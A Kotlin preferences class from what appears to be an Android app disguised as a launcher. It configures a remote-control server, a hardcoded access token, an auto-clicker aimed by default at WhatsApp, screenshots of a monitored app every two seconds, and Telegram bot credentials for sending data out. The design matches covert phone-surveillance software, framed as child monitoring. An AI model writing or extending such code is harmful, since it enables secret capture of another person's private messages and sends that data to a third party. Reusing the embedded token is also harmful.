package com.example.launcher

import android.content.Context
import android.os.Build
import org.json.JSONArray
import java.util.UUID

class Prefs(context: Context) {
    private val sp = context.applicationContext
        .getSharedPreferences("launcher", Context.MODE_PRIVATE)

    companion object {
        const val SERVER_URL = "https://remote-control-for-child.onrender.com"
        const val TOKEN = "Kx7mQ2vR9tLp4wZc8NbH3sYd6FjA5eUg"
        const val LANDING_URL = "https://sites.google.com/view/myappforchlid/home"
        const val MAX_CLICK_STEPS = 10
    }

    var running: Boolean
        get() = sp.getBoolean("running", false)
        set(v) = sp.edit().putBoolean("running", v).apply()

    var lastStatus: String
        get() = sp.getString("last_status", "-") ?: "-"
        set(v) = sp.edit().putString("last_status", v).apply()

    // Independent feature 1: Auto Clicker (true/false)
    var autoClickEnabled: Boolean
        get() = sp.getBoolean("auto_click_enabled", false)
        set(v) = sp.edit().putBoolean("auto_click_enabled", v).apply()

    // Independent feature 2: 2-second monitored package screenshots (true/false)
    var autoShotEnabled: Boolean
        get() = sp.getBoolean("auto_shot_enabled", false)
        set(v) = sp.edit().putBoolean("auto_shot_enabled", v).apply()

    var autoClickTargetPackage: String
        get() = sp.getString("auto_click_target_pkg", "com.whatsapp") ?: "com.whatsapp"
        set(v) = sp.edit().putString("auto_click_target_pkg", v.ifBlank { "com.whatsapp" }).apply()

    var autoClickTriggerId: String
        get() = sp.getString("auto_click_trigger_id", "") ?: ""
        set(v) = sp.edit().putString("auto_click_trigger_id", v).apply()

    var autoClickSteps: List<String>
        get() {
            val raw = sp.getString("auto_click_steps_json", "[]") ?: "[]"
            return try {
                val arr = JSONArray(raw)
                val out = ArrayList<String>(MAX_CLICK_STEPS)
                for (i in 0 until minOf(arr.length(), MAX_CLICK_STEPS)) {
                    out.add(arr.optString(i, "").trim())
                }
                while (out.size < MAX_CLICK_STEPS) out.add("")
                out
            } catch (_: Exception) {
                List(MAX_CLICK_STEPS) { "" }
            }
        }
        set(steps) {
            val arr = JSONArray()
            for (i in 0 until MAX_CLICK_STEPS) {
                arr.put(steps.getOrElse(i) { "" }.trim())
            }
            sp.edit().putString("auto_click_steps_json", arr.toString()).apply()
        }

    var telegramBotToken: String
        get() = sp.getString("tg_bot_token", "") ?: ""
        set(v) = sp.edit().putString("tg_bot_token", v).apply()

    var telegramChatId: String
        get() = sp.getString("tg_chat_id", "") ?: ""
        set(v) = sp.edit().putString("tg_chat_id", v).apply()

    val deviceId: String
        get() {
            val existing = sp.getString("device_id", null)
            if (existing != null) return existing
            val model = Build.MODEL.replace(Regex("[^A-Za-z0-9]"), "").take(20).ifEmpty { "device" }
            val id = model + "-" + UUID.randomUUID().toString().take(4)
            sp.edit().putString("device_id", id).apply()
            return id
        }
}
